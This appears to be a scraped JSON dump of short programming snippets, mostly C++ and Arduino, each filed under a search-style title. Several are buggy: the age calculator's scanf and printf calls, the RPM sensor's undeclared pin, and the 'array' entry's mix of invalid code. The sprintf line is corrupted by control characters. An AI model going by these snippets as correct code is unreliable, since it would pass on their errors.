    "description": "/* ALL PAIR SHORTEST PATH */  #include<stdlib.h> #include<stdio.h> #include<conio.h>  int c[100][100], p[100][100];  //c-cost matrix, p-path matrix(to store the path) int inf=1000, v;     //Assume Infinity as 1000 //int min(int x, int y); void show(); void path(int, int);  int main() {  int i, j, k, x;  clrscr();   printf(\"Enter the number of vertices in the graph: \");  scanf(\"%d\", &v);  /*  for(i=1;i<=v;i++)   for(j=1;j<=v;j++)    if(i==j)     c[i][j]=0;    else    {     printf(\"Is %d connected to %d?\",i,j);     printf(\"If yes, enter weight, else enter %d: \",inf);     scanf(\"%d\", &c[i][j]);    } */   printf(\"\\nEnter adjacency matrix:\\n\");  printf(\"(Enter 1000 if there is no path)\\n\");  for(i=1;i<=v;i++)   for(j=1;j<=v;j++)   {    scanf(\"%d\", &c[i][j]);    p[i][j]=-1;   }   printf(\"\\n\");   for(k=1;k<=v;k++)  {   for(i=1;i<=v;i++)   {    for(j=1;j<=v;j++)    {     if(i==j)      c[i][j]=0;     else     {      x=c[i][k]+c[k][j];      if(c[i][j]>x)      {       c[i][j]=x;       p[i][j]=k;      }     }    }   }   show();   printf(\"\\n\");  }   printf(\"From\\tTo\\tPath\\t\\tTotal Min. Cost\\n\");  for(i=1;i<=v;i++)  {   for(j=1;j<=v;j++)   {    if(i!=j)    {     printf(\"%d\\t\", i);     printf(\"%d\\t\", j);  //    printf(\"Path from %d to %d is: \",i,j);     printf(\"%d\", i);     path(i,j);     printf(\"%d\", j);      printf(\"\\t\\t%d\", c[i][j]);     printf(\"\\n\");    }   }  }  getch();  return 0; }  //-------TO SHOW THE PASSES------- void show() {  int i,j;  for(i=1;i<=v;i++)  {   for(j=1;j<=v;j++)    if(c[i][j]==1000)     printf(\"INF\\t\");    else     printf(\"%d\\t\", c[i][j]);   printf(\"\\n\");  } }  //-------TO SHOW THE PATH------- void path(int i, int j) {  int k;   k=p[i][j];  if(k==-1)  {   printf(\"->\");   return;  }  path(i, k);  printf(\"%d\",k);  path(k,j); }  /* OUTPUT  Enter the number of vertices in the graph: 3  Enter adjacency matrix: (Enter 1000 if there is no path) 0 8 5 3 0 1000 1000 2 0  0       8       5 3       0       8 INF     2       0  0       8       5 3       0       8 5       2       0  0       7       5 3       0       8 5       2       0  From    To      Path            Total Min. Cost 1       2       1->3->2         7 1       3       1->3            5 2       1       2->1            3 2       3       2->1->3         8 3       1       3->2->1         5 3       2       3->2            2 */ \n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 487,
    "keyword": null,
    "link": null,
    "title": " all permutations with repetition C++",
    "description": "#include <string> #include <iostream>   void print_str(const char*,std::string,const int, const int);  int main()  {      int lenght = 2;      char str[] = {'A', 'B', 'C', 'D'};        int n = sizeof str;      print_str(str, \"\", n, lenght);  //Note: this function works on all cases and not just the case above      return 0;  }  // The main recursive method to print all possible strings of length \"length\"     void print_str(const char str[],std::string prefix,const int n, const int lenght)      {          if (lenght == 1)              {                  for (int j = 0; j < n; j++)                  std::cout << prefix + str[j] << std::endl;              }//Base case: lenght = 1, print the string \"lenght\" times + the remaining letter          else              {                  // One by one add all characters from \"str\" and recursively call for \"lenght\" equals to \"lenght\"-1                 for (int i = 0; i < n; i++)                  // Next character of input added                 print_str(str, prefix + str[i], n, lenght - 1);                 // \"lenght\" is decreased, because we have added a new character              }      } \n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 488,
    "keyword": null,
    "link": null,
    "title": " all trigonometric functions with complex numbers in c/c++",
    "description": "#include \"stdafx.h\" #include \"calc.h\"   double INF = DBL_MAX; double mINF = INF * -1;  void cotan(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\tcomplex_tan(x, y); \t\tdivision(1.0, 0.0, resultR, resultI); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For cotangent function the valid domain is {x| x != 0 + kpi, k = ..., -1, 0, 1, ...}  \\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }  void sec(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\tcomplex_cos(x, y); \t\tdivision(1.0, 0.0, resultR, resultI); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For secant function the valid domain is {x| x != pi/2 + kpi, k = ..., -1, 0, 1, ...}  \\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }  void cosec(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\tcomplex_sin(x, y); \t\tdivision(1.0, 0.0, resultR, resultI); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For cosecant function the valid domain is {x| x != 0 + kpi, k = ..., -1, 0, 1, ...}  \\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }  void arcosec(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\tdivision(1.0, 0.0, x, y); \t\tcomplex_asin(resultR, resultI); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For arc cosecant function the valid domain is [-INF, INF] ^ != [-1, 1].\\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }  void arcsec(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\tdivision(1.0, 0.0, x, y); \t\tcomplex_acos(resultR, resultI); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For arc secant function the valid domain is ]-INF, INF[ ^ != [-1, 1].\\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }  void arcotg(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\tdivision(1.0, 0.0, x, y); \t\tcomplex_atan(resultR, resultI); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For arc cotangent function the valid domain is [-INF, INF].\\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }  void complex_cos(double x, double y) { \tresultR = 0; resultI = 0; \tif (x >= mINF && x <= INF && y >= mINF && y <= INF) { \t\texponentiation(M_E, 0.0, -1 * y, x, 1); \t\tdouble napR = resultR, napI = resultI; \t\texponentiation(M_E, 0.0, y, -1 * x, 1); \t\tdouble nap2R = resultR, nap2I = resultI; \t\tsum(napR, napI, nap2R, nap2I); \t\tdouble sumR = resultR, sumI = resultI; \t\tdivision(sumR, sumI, 2.0, 0.0); \t} \telse { \t\tif (rasf > 0) { \t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For cosine function the valid domain is [-INF, INF].\\n\\n\"); \t\t\tprintf(\" ==> Your function argument: \"); \t\t\tcomplexNumber(x, y); \t\t} \t} }\n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 489,
    "keyword": null,
    "link": null,
    "title": " allocation an array with new cpp",
    "description": "int *array = new int[length]; \n",
    "reg_date": "2021-10-12T11:37:17.000Z"
  },
  {
    "id": 490,
    "keyword": null,
    "link": null,
    "title": " allow cross origin",
    "description": "Access-Control-Allow-Origin: * Access-Control-Allow-Origin: <origin> Access-Control-Allow-Origin: null \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 491,
    "keyword": null,
    "link": null,
    "title": " alternating subsequence codeforces",
    "description": "#include<bits/stdc++.h>using namespace std; typedef long long ll;typedef long long int li;#define pb push_back#define ff first#define ss second#define FOR(n) for(int i=0;i<n;i++)#define FORD(n) for(int i=n-1;i>=0;i--) int main() {    ios_base::sync_with_stdio(false);     cin.tie(NULL); cout.tie(NULL);    //your code starts here    ll t; cin>>t;    while(t--)    {        ll n; cin>>n;        vector<ll> a(n);        for(int i=0;i<n;i++) cin>>a[i];        deque<ll> st;        st.push_front(a[0]);         int init_sign=a[0]/abs(a[0]);        for(int i=1;i<n;i++)        {            int sign=a[i]/abs(a[i]);            if(init_sign!=sign) st.push_front(a[i]);            else            {                if(a[i]>st.front()) {                    st.pop_front(); st.push_front(a[i]);                }            }            init_sign=sign;         }        ll ans=0;        for(auto x:st) ans+=x;        cout<<ans<<\"\\n\";    }    return 0;}  \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 492,
    "keyword": null,
    "link": null,
    "title": " ambiguity in inheritance c++",
    "description": "        #include<iostream.h>        #include<conio.h>         class ClassA        {               public:               int a;        };         class ClassB : public ClassA        {               public:               int b;        };        class ClassC : public ClassA        {               public:               int c;        };         class ClassD : public ClassB, public ClassC        {               public:               int d;        };         void main()        {  \t\t\t  ClassD obj;  \t\t\t  //obj.a = 10;                   //Statement 1, Error occur \t\t\t  //obj.a = 100;                 //Statement 2, Error occur  \t\t\t  obj.ClassB::a = 10;        //Statement 3 \t\t\t  obj.ClassC::a = 100;      //Statement 4  \t\t\t  obj.b = 20; \t\t\t  obj.c = 30; \t\t\t  obj.d = 40;  \t\t\t  cout<< \"\\n A from ClassB  : \"<< obj.ClassB::a; \t\t\t  cout<< \"\\n A from ClassC  : \"<< obj.ClassC::a;  \t\t\t  cout<< \"\\n B : \"<< obj.b; \t\t\t  cout<< \"\\n C : \"<< obj.c; \t\t\t  cout<< \"\\n D : \"<< obj.d;  \t   }     Output :                A from ClassB  : 10               A from ClassC  : 100               B : 20               C : 30               D : 40  \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 493,
    "keyword": null,
    "link": null,
    "title": " ampersand in cpp",
    "description": "the adress of a is saved in b b = &a; \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 494,
    "keyword": null,
    "link": null,
    "title": " amusia",
    "description": "#include<amusia> //No tener capacidad para reconocer la M&uacute;sica. //JavaScript\n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 495,
    "keyword": null,
    "link": null,
    "title": " an array that take different data type c++",
    "description": "array_name[index];\ntype array_name[array_size] = { number_of_value,..,..,.. }\narray_name[index] = number_of_value;\n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 496,
    "keyword": null,
    "link": null,
    "title": " and c++",
    "description": "#include<iostream> using namespace std; int main(){ \tint a; \tcin>>a; \tif(a >= 20 && a <= 30){ \t\tcout<<\"Il numero inserito &egrave; compreso tra 20 e 30\"; \t} \telse{ \t\tcout<<\"Il numero inserito non &egrave; compreso tra 20 e 30\"; \t} }\npacket >> rec1.getPosition().x >> rec1.getPosition().y; \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 497,
    "keyword": null,
    "link": null,
    "title": " android emulator wifi connected without internet",
    "description": "May be a VPN problem, disconnect from it  On Windows  Open Network and Sharing Center and click on current Connection Click on Properties Double Click on Internet Protocol Version 4 (TCP/IPv4) Set the Preferred and Alternate DNS servers as (Screenshot below) :  8.8.8.8 8.8.4.4 On Mac  Go to Settings > Network > Advanced... > DNS Delete whatever entries you have there and add these two entries (Screenshot below):  8.8.8.8 8.8.4.4 \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 498,
    "keyword": null,
    "link": null,
    "title": " ano de nascimento e devolva a idade c++",
    "description": "#include <stdio.h> #include <stdlib.h> #include <conio.h>  int main ()  { \tint anoatual; \tint anodenascimento; \tint idade;  \tprintf(\"Digite o ano atual:\"); \tscanf(\"%d,&anoatual\"); \t \tprintf(\"Digite o ano de nascimento:\"); \tscanf(\"%d,&anodenascimento\"); \t \tidade=(anoatual-anodenascimento); \t \tprintf (\"A idade e:%d\",&idade); \tsystem (\"pause\");\t }\n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 499,
    "keyword": null,
    "link": null,
    "title": " apertura file in c++",
    "description": "std::ifstream ifs(\"foo.txt\");  // ifstream: Opens file \"foo.txt\" for reading only.  std::ofstream ofs(\"foo.txt\");  // ofstream: Opens file \"foo.txt\" for writing only.  std::fstream iofs(\"foo.txt\");  // fstream:  Opens file \"foo.txt\" for reading and writing. \n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 500,
    "keyword": null,
    "link": null,
    "title": " append string c++",
    "description": "// appending to string #include <iostream> #include <string>  int main () {   std::string str;   std::string str2=\"Writing \";   std::string str3=\"print 10 and then 5 more\";    // used in the same order as described above:   str.append(str2);                       // \"Writing \"   str.append(str3,6,3);                   // \"10 \"   str.append(\"dots are cool\",5);          // \"dots \"   str.append(\"here: \");                   // \"here: \"   str.append(10u,'.');                    // \"..........\"   str.append(str3.begin()+8,str3.end());  // \" and then 5 more\"   str.append<int>(5,0x2E);                // \".....\"    std::cout << str << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:37:18.000Z"
  },
  {
    "id": 501,
    "keyword": null,
    "link": null,
    "title": " append string to another string c++",
    "description": "// appending to string #include <iostream> #include <string>  int main () {   std::string str;   std::string str2=\"Writing \";   std::string str3=\"print 10 and then 5 more\";    // used in the same order as described above:   str.append(str2);                       // \"Writing \"   str.append(str3,6,3);                   // \"10 \"   str.append(\"dots are cool\",5);          // \"dots \"   str.append(\"here: \");                   // \"here: \"   str.append(10u,'.');                    // \"..........\"   str.append(str3.begin()+8,str3.end());  // \" and then 5 more\"   str.append<int>(5,0x2E);                // \".....\"    std::cout << str << '\\n';   return 0; }\n// string::operator+= #include <iostream> #include <string>  int main () {   std::string name (\"John\");   std::string family (\"Smith\");   name += \" K. \";         // c-string   name += family;         // string   name += '\\n';           // character    std::cout << name;   return 0; }\n// appending to string #include <iostream> #include <string>  int main () {   // easy way   std::string str = \"Hello\";   std::string str2 = \" World\";   std::cout << str + str2 << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 502,
    "keyword": null,
    "link": null,
    "title": " appending a double to a string c++",
    "description": "std::ostringstream strs; strs << dbl; std::string str = strs.str();\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 503,
    "keyword": null,
    "link": null,
    "title": " appending int to string in cpp",
    "description": "#include <string>     // to use std::string, std::to_string() and \"+\" operator acting on strings   int i = 4; std::string text = \"Player \"; text += std::to_string(i); \n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 504,
    "keyword": null,
    "link": null,
    "title": " appending string in c++",
    "description": "#include<iostream> #include <string> int main() { \t//\"Ever thing inside these double quotes becomes const char array\" //\tstd::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl;// output=>Caleb Hello //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;// output=>Caleb Hello \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 505,
    "keyword": null,
    "link": null,
    "title": " apple and orange hackerrank solution in c++",
    "description": "#include<iostream> using namespace std;   int main() {       int s,t,a,b,m,n;     cin>>s>>t>>a>>b>>m>>n;     int arr[m];     int arr1[n];     int apple=0;     int orange=0;          for(int i=0;i<m;i++){         cin>>arr[i];         if(a+arr[i]>=s && a+arr[i]<=t){             apple++;         }     }        for(int i=0;i<n;i++){         cin>>arr1[i];         if(b+arr1[i]>=s && b+arr1[i]<=t){             orange++;         }     }     cout<<apple<<endl<<orange<<endl;    }\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 506,
    "keyword": null,
    "link": null,
    "title": " apply pca to dataframe",
    "description": "import pandas as pd import numpy as np from sklearn.decomposition import PCA  df = pd.DataFrame(data=np.random.normal(0, 1, (20, 10)))  pca = PCA(n_components=5) pca.fit(df) \n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 507,
    "keyword": null,
    "link": null,
    "title": " arduino buildin let",
    "description": "pinMode(LED_BUILTIN,OUTPUT); digitalWrite(LED_BUILTIN,HIGH); digitalWrite(LED_BUILTIN,LOW);\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 508,
    "keyword": null,
    "link": null,
    "title": " arduino falling edge",
    "description": "int button = 2; int flag; int readbutton; void setup(){} void loop(){   readbutton = digitalRead(button);   if(readbutton>flag){   //your code here   flag=readbutton; } if(readbutton==0){ flag=0; }\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 509,
    "keyword": null,
    "link": null,
    "title": " arduino flame sensor project",
    "description": "// lowest and highest sensor readings: const int sensorMin = 0;     // sensor minimum const int sensorMax = 1024;  // sensor maximum  void setup() {   // initialize serial communication @ 9600 baud:   Serial.begin(9600);   } void loop() {   // read the sensor on analog A0: \tint sensorReading = analogRead(A0);   // map the sensor range (four options):   // ex: 'long int map(long int, long int, long int, long int, long int)' \tint range = map(sensorReading, sensorMin, sensorMax, 0, 3);      // range value:   switch (range) {   case 0:    // A fire closer than 1.5 feet away.     Serial.println(\"** Close Fire **\");     break;   case 1:    // A fire between 1-3 feet away.     Serial.println(\"** Distant Fire **\");     break;   case 2:    // No fire detected.     Serial.println(\"No Fire\");     break;   }   delay(1);  // delay between reads } \n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 510,
    "keyword": null,
    "link": null,
    "title": " arduino for command",
    "description": "// Dim an LED using a PWM pin int PWMpin = 10;  // LED in series with 470 ohm resistor on pin 10  void setup() {   // no setup needed }  void loop() {   for (int i = 0; i <= 255; i++) {     analogWrite(PWMpin, i);     delay(10);   } }\n",
    "reg_date": "2021-10-12T11:37:19.000Z"
  },
  {
    "id": 511,
    "keyword": null,
    "link": null,
    "title": " arduino function not declared in this scope",
    "description": "Is there a syntax error anywhere? A missing '(' og a missing ';'?\n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 512,
    "keyword": null,
    "link": null,
    "title": " arduino jumper programmieren",
    "description": "const byte jumperPin1 = 12; const byte jumperPin2 = 9;  void setup() {   pinMode(jumperPin1, INPUT_PULLUP);   pinMode(jumperPin2, INPUT_PULLUP);   Serial.begin(9600); }  void loop() {   if (digitalRead(jumperPin1) == 0)   {     Serial.println(\"BLAU\");   }     if (digitalRead(jumperPin2) == 0)   {     Serial.println(\"ROT\");   }  } \n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 513,
    "keyword": null,
    "link": null,
    "title": " arduino keypad library",
    "description": "#include <Keypad.h>  const byte ROWS = 4;  const byte COLS = 4;   char hexaKeys[ROWS][COLS] = {   {'1', '2', '3', 'A'},   {'4', '5', '6', 'B'},   {'7', '8', '9', 'C'},   {'*', '0', '#', 'D'} };  byte rowPins[ROWS] = {9, 8, 7, 6};  byte colPins[COLS] = {5, 4, 3, 2};   Keypad customKeypad = Keypad(makeKeymap(hexaKeys), rowPins, colPins, ROWS, COLS);   void setup(){   Serial.begin(9600); }    void loop(){   char customKey = customKeypad.getKey();      if (customKey){     Serial.println(customKey);   } }\nconst byte rows = 4; //four rows const byte cols = 3; //three columns char keys[rows][cols] = {   {'1','2','3'},   {'4','5','6'},   {'7','8','9'},   {'#','0','*'} }; byte rowPins[rows] = {5, 4, 3, 2}; //connect to the row pinouts of the keypad byte colPins[cols] = {8, 7, 6}; //connect to the column pinouts of the keypad Keypad keypad = Keypad( makeKeymap(keys), rowPins, colPins, rows, cols ); \n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 514,
    "keyword": null,
    "link": null,
    "title": " arduino lcd hello world",
    "description": "// include the library code: #include <LiquidCrystal.h>  // initialize the library with the numbers of the interface pins LiquidCrystal lcd(12, 11, 5, 4, 3, 2);  void setup() {   // set up the LCD's number of columns and rows:   lcd.begin(16, 2);      // Print a message to the LCD.   lcd.print(\"ROBO-CREATORS\");//YOU CAN CHANGE IT }  void loop() {   // set the cursor to column 0, line 1   // (note: line 1 is the second row, since counting begins with 0):   lcd.setCursor(0, 1);      // print the number of seconds since reset:   lcd.print(millis() / 1000); } \n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 515,
    "keyword": null,
    "link": null,
    "title": " arduino liquid crystal",
    "description": "#include <LiquidCrystal.h>  const int rs = 12, en = 11, d4 = 5, d5 = 4, d6 = 3, d7 = 2; LiquidCrystal lcd(rs, en, d4, d5, d6, d7);  void setup() {   lcd.begin(16, 2);   lcd.print(\"hello, world!\"); }  void loop() {   lcd.setCursor(0, 1);   lcd.print(millis() / 1000); }   \n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 516,
    "keyword": null,
    "link": null,
    "title": " arduino notone",
    "description": "Stops the generation of a square wave triggered by tone(). Has no effect if no tone is being generated.\n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 517,
    "keyword": null,
    "link": null,
    "title": " arduino rpm sensor",
    "description": "//From arduino forums, but with slight changes //To use with a infrared sensor (KY-032) //and (optional) a liquid crystal I2C Display (4 rows and 16 columns) #include <LiquidCrystal_I2C.h>  LiquidCrystal_I2C lcd(0x27, 20, 4);     //declare the lcd display  const int pinIRSensor = 2;\t//that's the pin for the IR-Sensor  float rpm = 0; float rev = 0;  unsigned long oldtime = 0; unsigned long time;  void isr() {   rev++; }  void setup() {   lcd.begin();   lcd.backlight();   lcd.setCursor(0, 0);   lcd.print(\" RPM-IR-Sensor: \");   attachInterrupt(digitalPinToInterrupt (pinIRSensor), isr, RISING); }  void loop() {   delay(1000);   detachInterrupt(digitalPinToInterrupt(pinRPM));   time = millis() - oldtime;   rpm = ((float) rev / (float) time) * 60000.f;   oldtime = millis();   rev = 0;   lcd.setCursor(0, 1);   lcd.print(rpm);   lcd.print(\" r/min\");   attachInterrupt(digitalPinToInterrupt(pinRPM), isr, RISING); }\n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 518,
    "keyword": null,
    "link": null,
    "title": " arduino sprintf float",
    "description": "// On arduino, sprintf does not support formatting floats, but it can be done  // with some simple integer formatting:  float f = 3.14; sprintf(str, \"Float value: %d.\u0002d\", (int)f, (int)(fabsf(f)*100)\u00100);  // str will now be: \"Float value: 3.14\"\n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 519,
    "keyword": null,
    "link": null,
    "title": " arduino switch case",
    "description": "// Arduino => c++ switch (var) {   case 1:     //do something when var equals 1     break;   case 2:     //do something when var equals 2     break;   default:     // if nothing else matches, do the default     // default is optional     break; }\nswitch (var) {   case label1:     // statements     break;   case label2:     // statements     break;   default:     // statements     break; }\n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 520,
    "keyword": null,
    "link": null,
    "title": " arduino uno hello world",
    "description": "/* Plug you arduino board, upload the code, run monitor ( ctrl+shift+M ) */ void setup() {   Serial.begin(9600);   pinMode(13, OUTPUT); // on led in pin 13   Serial.print('Hello World');//show text ini monitor arduino IDE }\n",
    "reg_date": "2021-10-12T11:37:20.000Z"
  },
  {
    "id": 521,
    "keyword": null,
    "link": null,
    "title": " are arrays faster than vectors c++",
    "description": "yes,but not by very much.\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 522,
    "keyword": null,
    "link": null,
    "title": " are maps sorted c++",
    "description": "By default, a Map in C++ is sorted in increasing order based on its key.\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 523,
    "keyword": null,
    "link": null,
    "title": " argsort c++",
    "description": "#include <iostream> #include <vector> #include <numeric>      // std::iota #include <algorithm>    // std::sort, std::stable_sort  using namespace std;  template <typename T> vector<size_t> sort_indexes(const vector<T> &v) {    // initialize original index locations   vector<size_t> idx(v.size());   iota(idx.begin(), idx.end(), 0);    // sort indexes based on comparing values in v   // using std::stable_sort instead of std::sort   // to avoid unnecessary index re-orderings   // when v contains elements of equal values    stable_sort(idx.begin(), idx.end(),        [&v](size_t i1, size_t i2) {return v[i1] < v[i2];});    return idx; }  //Usage: for (auto i: sort_indexes(v)) {   cout << v[i] << endl; }\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 524,
    "keyword": null,
    "link": null,
    "title": " argument for c11 in c++",
    "description": "$ g++ -std=c++11 your_file.cpp -o your_program\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 525,
    "keyword": null,
    "link": null,
    "title": " argument to number C++",
    "description": "// C++ Code int x = atoi(argv[1]); \n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 526,
    "keyword": null,
    "link": null,
    "title": " arguments to a class instance c++",
    "description": "int courseId = 0; Instructor instructor; // Here we default construct an Instructor std::string courseName = \"Foo\"; std::string dept = \"Bar\";  Course my_course(courseId, instructor, courseName, dept); //                         ^^^^^^^^^^ //              Here the Instructor is being passed \n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 527,
    "keyword": null,
    "link": null,
    "title": " armstrong",
    "description": "public class Armstrong {      public static void main(String[] args) {          int number = 1634, originalNumber, remainder, result = 0, n = 0;          originalNumber = number;          for (;originalNumber != 0; originalNumber /= 10, ++n);          originalNumber = number;          for (;originalNumber != 0; originalNumber /= 10)         {             remainder = originalNumber % 10;             result += Math.pow(remainder, n);         }          if(result == number)             System.out.println(number + \" is an Armstrong number.\");         else             System.out.println(number + \" is not an Armstrong number.\");     } }\n//examples = 370;371;153;407; // made by Kashish Vaid the great #include <stdio.h> #include <math.h> void main() { int i, num, result=0, remainder; // applicable for 3 digits only  printf(\"Enter 3 digit number: \"); scanf(\"%d\",&num);  for( i=num ; i != 0 ; i/=10) \t\t{    \t\tremainder = i % 10; \t\tresult += remainder * remainder * remainder;         }     // if else shortcut     ( (result == num) ? printf(\"%d is an Armstrong no.\",num) : printf(\"%d isn't an Armstrong no.\",num) ); } // made by Kashish Vaid the great \n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 528,
    "keyword": null,
    "link": null,
    "title": " array<string, 7> c++",
    "description": "//dayType.h, the specification file for the class dayType #include <iostream> #include <string> using namespace std;  class dayType{  private: \t \t \tstring day; // To hold single instance of the name of a weekday.  \tconst string dayName[7]; // holds the names of the of the seven weekdays \t\t//\"Sunday\", \"Monday\", \"Tuesday\", \"Wedensday\", \"Thursday\", \"Friday\", \"Saturday\"  \tint dayNumber; // To hold an int representation of the location of a spicific day  \t    //within the array \t \tvoid setDay(); // Function to set the DayType variable \"day\" to the name of a  \t\t//weekday. This function recieves a call from promptUser() and begins by asking  \t\t//the user to enter the day to set.  \t\t//Postcondition: after the user enters the information in the form of a  \t\t//weekday name this function sets the day to that value. public:  \tvoid promptUser(); // Asks the user if they want to set the day and if yes  \t\t//prompts the user to set the day by entering the day name via function setDay. \t\t//Postcondition: If the user chooses to enter Y for yes when prompted this  \t\t//function calls setDay()  \t\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 529,
    "keyword": null,
    "link": null,
    "title": " array",
    "description": "double prod(double #1,int #2){    double result= 1;    for(int i = 0;i<length;i++){        result = result * array[i];    }    return result;}\nmy_list = [-15, -26, 15, 1, 23, -64, 23, 76] new_list = []  while my_list:     min = my_list[0]       for x in my_list:          if x < min:             min = x     new_list.append(min)     my_list.remove(min)      print(new_list)\narray 7 \n// An array in javascript is basicly a data structure set out like this: const MyArray = {\"Object1\", \"Object2\", \"Object3\"};\n// sorting an array of strings var names = [\"Adam\", \"Jeffrey\", \"Fabiano\", \"Danil\", \"Ben\"];  // returns the sorted array console.log(names.sort());  // modifies the array in place console.log(names);  var priceList = [1000, 50, 2, 7, 14]; priceList.sort();  // Number is converted to string and sorted console.log(priceList)\nint[] spam = new int[] { 1, 2, 3 }; Arrays.stream(spam)       .boxed()       .collect(Collectors.toList()); \n<!DOCTYPE html> <html>    <body>       <script>          var str = [\"1818-15-3\", \"1819-16-3\"];          var arr = str.split(\":\");           document.write(arr[1] + \":\" + arr[2]);      </script>    </body> </html>\nhellow world im here \n// this is sumple array let array=[1,2,3,4]\n$ git config --global user.name \"Yad Sallivann\" $ git config --global user.email willdaba20@gmail.com\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 530,
    "keyword": null,
    "link": null,
    "title": " array 2d dynamic allocation c++",
    "description": "int** a = new int*[rowCount]; for(int i = 0; i < rowCount; ++i)     a[i] = new int[colCount];\n",
    "reg_date": "2021-10-12T11:37:21.000Z"
  },
  {
    "id": 531,
    "keyword": null,
    "link": null,
    "title": " array 2d to 1d",
    "description": " int array[width * height];   int SetElement(int row, int col, int value)  {     array[width * row + col] = value;    }\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 532,
    "keyword": null,
    "link": null,
    "title": " array and for loop in c++",
    "description": "int v[] = {1,2,3,4,5}; for (int n : v)   cout << n << endl; //make sure to compile with -std=c++11\n//inserting array elements in cpp #include<iostream> using namespace std; int main() {   int arr[100];//you can give any data type and any array size you want   for(int i=0;i<100;i++)   {     cin>>arr[i];   }   return 0; }\n",
    "reg_date": "2021-10-12T11:37:22.000Z"
  },
  {
    "id": 533,
    "keyword": null,
    "link": null,
    "title": " array as parameter c++",
